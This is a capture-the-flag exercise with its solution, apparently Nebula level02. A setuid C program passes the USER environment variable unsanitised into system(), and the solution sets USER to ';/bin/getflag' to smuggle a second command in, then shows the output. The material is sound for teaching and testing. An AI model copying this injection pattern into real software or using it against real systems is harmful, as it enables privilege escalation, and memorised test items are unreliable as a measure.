### Prompt
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
}
```

### Solution
The program grabs the content of the ``USER`` environment variable and executes ``system("/bin/echo <content of USER> is cool")``.

We want to modify the variable with the command we need to execute: ``/bin/getflag``.

Since ``echo`` is called using its full path (``/bin/echo``) the PATH is not used so ``echo`` will be executed no matter what. We can just use a semicolon to execute several commands in one line.

```shell
level02@nebula:/home/flag02$ export USER=";/bin/getflag"
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo ;/bin/getflag is cool")

You have successfully executed getflag on a target account
```
